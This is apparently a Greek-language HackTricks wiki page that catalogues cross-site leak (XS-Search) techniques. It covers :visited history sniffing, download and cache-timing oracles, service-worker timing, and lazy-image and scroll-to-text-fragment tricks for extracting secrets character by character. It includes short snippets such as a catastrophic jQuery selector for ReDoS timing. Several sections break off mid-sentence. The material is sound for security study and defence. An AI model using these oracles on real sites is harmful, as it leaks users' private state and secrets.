Οι web εφαρμογές μπορεί να αλλάξουν τη **μορφοποίηση της ιστοσελίδας ανάλογα με την κατάσταση της χρήσης**. Τα αρχεία CSS διαφορετικής προέλευσης μπορούν να ενσωματωθούν στη σελίδα του επιτιθέμενου με το **στοιχείο σύνδεσης HTML**, και οι **κανόνες** θα εφαρμοστούν στη σελίδα του επιτιθέμενου. Εάν μια σελίδα αλλάζει δυναμικά αυτούς τους κανόνες, ένας επιτιθέμενος μπορεί να **ανιχνεύσει** αυτές τις **διαφορές** ανάλογα με την κατάσταση του χρήστη.\
Ως τεχνική διαρροής, ο επιτιθέμενος μπορεί να χρησιμοποιήσει τη μέθοδο `window.getComputedStyle` για να **διαβάσει τις ιδιότητες CSS** ενός συγκεκριμένου στοιχείου HTML. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να διαβάσει αυθαίρετες ιδιότητες CSS εάν το σχετιζόμενο στοιχείο και το όνομα της ιδιότητας είναι γνωστά.

### Ιστορικό CSS

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Σύνοψη:** Ανιχνεύστε αν ο στυλ `:visited` εφαρμόζεται σε μια διεύθυνση URL υποδηλώνοντας ότι έχει ήδη επισκεφθεί
* **Παράδειγμα Κώδικα**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Σύμφωνα με [**αυτό**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), αυτό δεν λειτουργεί στο headless Chrome.
{% endhint %}

Ο επιλογέας CSS `:visited` χρησιμοποιείται για να δώσει στυλ σε διευθύνσεις URL διαφορετικά αν έχουν ήδη επισκεφθεί από τον χρήστη. Στο παρελθόν, η μέθοδος `getComputedStyle()` θα μπορούσε
### Περιεχόμενο Έγγραφου X-Frame Leak

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Σύνοψη:** Στο Google Chrome, εμφανίζεται μια αφιερωμένη σελίδα σφάλματος όταν μια σελίδα αποκλείεται από ενσωμάτωση σε ιστότοπο διαφορετικής προέλευσης λόγω περιορισμών X-Frame-Options.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στο Chrome, εάν μια σελίδα με την κεφαλίδα `X-Frame-Options` ρυθμισμένη σε "deny" ή "same-origin" ενσωματωθεί ως αντικείμενο, εμφανίζεται μια σελίδα σφάλματος. Το Chrome επιστρέφει μοναδικά ένα κενό αντικείμενο εγγράφου (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του αντικειμένου, αντίθετα από τα iframes ή άλλους περιηγητές. Οι επιτιθέμενοι θα μπορούσαν να εκμεταλλευτούν αυτό εντοπίζοντας το κενό έγγραφο, αποκαλύπτοντας πιθανώς πληροφορίες σχετικά με την κατάσταση του χρήστη, ειδικά εάν οι προγραμματιστές ρυθμίζουν ανεπαρκώς την κεφαλίδα X-Frame-Options, παραβλέποντας συχνά τις σελίδες σφάλματος. Η ευαισθητοποίηση και η συνεπής εφαρμογή των κεφαλίδων ασφαλείας είναι ζωτικής σημασίας για την πρόληψη τέτοιων διαρροών.

### Ανίχνευση Λήψης

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Σύνοψη:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος iframes· η συνεχής προσβασιμότητα του iframe υπονοεί επιτυχημένη λήψη αρχείου.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Η κεφαλίδα `Content-Disposition`, ειδικά `Content-Disposition: attachment`, οδηγεί τον περιηγητή να κατεβάσει το περιεχόμενο αντί να το εμφανίσει ενσωματωμένο. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνευθεί εάν ένας χρήστης έχει πρόσβαση σε μια σελίδα που ενεργοποιεί λήψη αρχείου. Στους περιηγητές βασισμένους σε Chromium, υπάρχουν μερικές τεχνικές για την ανίχνευση αυτής της συμπεριφοράς λήψης:

1. **Παρακολούθηση Γραμμής Λήψης**:
* Όταν ένα αρχείο κατεβαίνει σε περιηγητές βασισμένους σε Chromium, εμφανίζεται μια γραμμή λήψης στο κάτω μέρος του παραθύρου του περιηγητή.
* Με την παρακολούθηση των αλλαγών στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της γραμμής λήψης, υπονοώντας ότι η λήψη έχει ξεκινήσει.
2. **Πλοήγηση Λήψης με Iframes**:
* Όταν μια σελίδα ενεργοποιεί λήψη αρχείου χρησιμοποιώντας την κεφαλίδα `Content-Disposition: attachment`, δεν προκαλεί γεγονός πλοήγησης.
* Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας τα γεγονότα πλοήγησης, είναι δυνατό να ελεγχθεί εάν η κατάσταση του περιεχομένου προκαλεί λήψη αρχείου (χωρίς πλοήγηση) ή όχι.
3. **Πλοήγηση Λήψης χωρίς Iframes**:
* Παρόμοια με την τεχνική του iframe, αυτή η μέθοδος περιλαμβάνει τη χρήση του `window.open` αντί για ένα iframe.
* Η παρακολούθηση των γεγονότων πλοήγησης στο νεοδημιουργημένο παράθυρο μπορεί να αποκαλύψει εάν έχει ενεργοποιηθεί λήψη αρχείου (χωρίς πλοήγηση) ή αν το περιεχόμενο εμφανίζεται ενσωματωμένο (πραγματοποιείται πλοήγηση).

Σε περιπτώσεις όπου μόνο συνδεδεμένοι χρήστες μπορούν να ενεργοποιήσουν τέτοιες λήψεις, αυτές οι τεχνικές μπορούν να χρησιμοποιηθούν για να εμμέσως εξάγουν πληροφορίες για την κατάσταση πιστοποίησης του χρήστη με βάση την αντίδραση του περιηγητή στο αίτημα λήψης.

### Διαφυγή Χρήσης Χωρισμένης Προσωρινής Μνήμης HTTP <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Μέθοδοι Ενσωμάτωσης**: Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Χρονισμός
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Σύνοψη:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος iframes· η συνεχής προσβασιμότητα του iframe υπονοεί επιτυχημένη λήψη αρχείου.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (από [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Αυτή είναι η ενδιαφέρουσα τεχνική: Το Chrome τώρα έχει **διαχωρισμό μνήμης cache**, και το κλειδί cache της νεοδημιουργημένης σελίδας είναι: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, αλλά αν ανοίξω μια σελίδα ngrok και χρησιμοποιήσω fetch σε αυτή, το κλειδί cache θα είναι: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, το **κλειδί cache είναι διαφορετικό**, έτσι το cache δεν μπορεί να μοιραστεί. Μπορείτε να βρείτε περισσότερες λεπτομέρειες εδώ: [Απόκτηση ασφάλειας και απορρήτου με διαχωρισμό της μνήμης cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Σχόλιο από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Εάν ένας ιστότοπος `example.com` περιλαμβάνει ένα πόρο από `*.example.com/resource` τότε αυτός ο πόρος θα έχει το **ίδιο κλειδί κρυφής μνήμης** όπως αν ο πόρος αιτείται απευθείας μέσω πλοήγησης σε επίπεδο κορυφαίας σελίδας. Αυτό συμβαίνει επειδή το κλειδί κρυφής μνήμης αποτελείται από το _eTLD+1_ κορυφαίας σελίδας και το _eTLD+1_ πλαισίου.

Επειδή η πρόσβαση στην μνήμη cache είναι ταχύτερη από το φόρτωμα ενός πόρου, είναι δυνατόν να προσπαθήσετε να αλλάξετε την τοποθεσία μιας σελίδα
### Ρύπανση Σεναρίου

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML (script)
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Σύνοψη:** Είναι δυνατόν να **αντικατασταθούν ενσωματωμένες λειτουργίες** και να διαβαστούν τα ορίσματά τους ακόμα και από **σενάριο διαφορετικής προέλευσης** (το οποίο δεν μπορεί να διαβαστεί απευθείας), κάτι που μπορεί να **διαρρεύσει πολύτιμες πληροφορίες**.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Εργαζόμενοι Υπηρεσίας <a href="#service-workers" id="service-workers"></a>

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα Παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Σύνοψη:** Μέτρηση του χρόνου εκτέλεσης μιας ιστοσελίδας χρησιμοποιώντας υπηρεσίες εργαζομένων.
* **Παράδειγμα Κώδικα**:

Στο δεδομένο σενάριο, ο επιτιθέμενος αναλαμβάνει την πρωτοβουλία να εγγράψει έναν **εργαζόμενο υπηρεσίας** σε έναν από τους τομείς του, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στην ιστοσελίδα-στόχο από τον κύριο εγγραφής και οδηγεί τον **εργαζόμενο υπηρεσίας** να ξεκινήσει ένα χρονόμετρο. Καθώς το νέο παράθυρο αρχίζει να φορτώνει, ο επιτιθέμενος πλοηγείται στην αναφορά που λάβει στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **εργαζόμενος υπηρεσίας**.

Κατά την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **εργαζόμενος υπηρεσίας** απαντά με έναν κωδικό κατάστασης **204 (Χωρίς Περιεχόμενο)**, τερματίζοντας αποτελεσματικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **εργαζόμενος υπηρεσίας** καταγράφει μια μέτρηση από το χρονόμετρο που ξεκίνησε νωρίτερα στο δεύτερο βήμα. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

{% hint style="warning" %}
Σε μια χρονομέτρηση εκτέλεσης είναι δυνατόν να **εξαλειφθούν** **παράγοντες δικτύου** για να ληφθούν **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φόρτωσή της.
{% endhint %}

### Χρονομέτρηση Ανάκτησης

* **Μέθοδοι Ενσωμάτωσης**: Ανάκτηση Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχόμενου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Σύνοψη:** Χρησιμοποιήστε το [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να πραγματοποιηθεί μια αίτηση. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Χρονομέτρηση Διαστήματος Παραθύρου

* **Μέθοδοι Ενσωμάτωσης**: Ανάκτηση Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχόμενου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Σύνοψη:** Χρησιμοποιήστε το [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να πραγματοποιηθεί μια αίτηση χρησιμοποιώντας το `window.open`. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε Πρόσβαση Σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Με HTML ή Επαναεισαγωγή

Εδώ μπορείτε να βρείτε τεχνικές για την εξυφάντωση πληροφοριών από μια σελίδα HTML διαφορετικής προέλευσης **εισάγοντας περιεχόμενο HTML**. Αυτές οι τεχνικές είναι ενδιαφέρουσες σε περιπτώσεις όπου για οποιονδήποτε λόγο μπορείτε **να εισάγετε HTML αλλά δεν μπορείτε να εισάγετε κώδικα JS**.

### Κρεμασμένο Σήμα

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Αργή Φόρτωση Εικόνας

Αν χρειάζεστε να **εξυφαντάτε περιεχόμενο** και μπορείτε **να προσθέσετε HTML πριν το μυστικό** πρέπει να ελέγξετε τις **κοινές τεχνικές κρεμασμένου σήματος**.\
Ωστόσο, αν για οποιονδήποτε λόγο **ΠΡΕΠΕΙ** να το κάνετε **χαρακτήρα προς χαρακτήρα** (ίσως η επικοινωνία γίνεται μέσω ενός cache hit) μπορείτε να χρησιμοποιήσετε αυτό το κόλπο.

Οι **εικόνες** στο HTML έχουν ένα χαρακτηριστικό "**φόρτωσης**" του οποίου η τιμή μπορεί να είναι "**lazy**". Σε αυτήν την περίπτωση, η εικόνα θα φορτωθεί όταν προβληθεί και όχι κατά τη φόρτωση της σελίδας:
```html
<img src=/something loading=lazy >
```
Επομένως, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς χαρακτήρες αχρείαστους** (Για παράδειγμα **χιλιάδες "W"**) για να **γεμίσετε την ιστοσελίδα πριν το μυστικό ή να προσθέσετε κάτι σαν** `<br><canvas height="1850px"></canvas><br>.`\
Έπειτα, αν για παράδειγμα η **ενσωμάτωσή μας εμφανιστεί πριν τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία συν τα άχρηστα δεδομένα θα **την εμποδίσουν να φορτωθεί** (θα πρέπει να πειραματιστείτε με το πόσα άχρηστα δεδομένα να τοποθετήσετε). Αυτό συνέβη στο [**συγκεκριμένο άρθρο**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα ήταν να χρησιμοποιήσετε το **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, μπορείτε να κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι σαν
```
#:~:text=SECR
```
Έτσι η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τα κακόβουλα χαρακτήρες του επιτιθέμενου και μια εικόνα που φορτώνεται με καθυστέρηση, και στη συνέχεια προστίθεται το μυστικό του bot.

Αυτό το κείμενο θα κάνει το bot να έχει πρόσβαση σε οποιοδήποτε κείμενο στη σελίδα που περιέχει το κείμενο `SECR`. Καθώς αυτό το κείμενο είναι το μυστικό και βρίσκεται **ακριβώς κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο αν το μυστικό που μαντεύεται είναι σωστό**. Έτσι έχετε τον οράκελό σας για **εξαγωγή του μυστικού χαρακτήρα προς τον χαρακτήρα**.

Κάποιο παράδειγμα κώδικα για να εκμεταλλευτείτε αυτό: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Χρόνος Φόρτωσης Εικόνας με Καθυστέρηση

Αν **δεν είναι δυνατή η φόρτωση μιας εξωτερικής εικόνας** που θα μπορούσε να υποδείξει στον επιτιθέμενο ότι η εικόνα φορτώθηκε, μια άλλη επιλογή θα ήταν να **προσπαθήσετε να μαντέψετε τον χαρακτήρα αρκετές φορές και να το μετρήσετε**. Αν η εικόνα φορτώνεται, όλα τα αιτήματα θα πάρουν περισσότερο χρόνο από ό,τι αν η εικόνα δεν φορτώνεται. Αυτό είναι αυτό που χρησιμοποιήθηκε στην [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **που περιλαμβάνεται εδώ:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Αν χρησιμοποιείται το `jQuery(location.hash)`, είναι δυνατόν να ανακαλύψετε μέσω χρονομέτρησης **αν υπάρχει κάποιο περιεχόμενο HTML**, αυτό οφείλεται στο γεγονός ότι αν το επιλογέας `main[id='site-main']` δεν ταιριάζει δεν χρειάζεται να ελεγχθούν τα υπόλοιπα **επιλογείς**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Ενσωμάτωση CSS

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Αμυντικά Μέτρα

Υπάρχουν προτεινόμενες μεθόδοι αντιμετώπισης στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) επίσης σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευτείτε από αυτές τις τεχνικές.

## Αναφορές

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για εύκολη δημιουργία και **αυτοματοποίηση ροών εργασίας** με τα πιο **προηγμένα εργαλεία κοινότητας** στον κόσμο.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
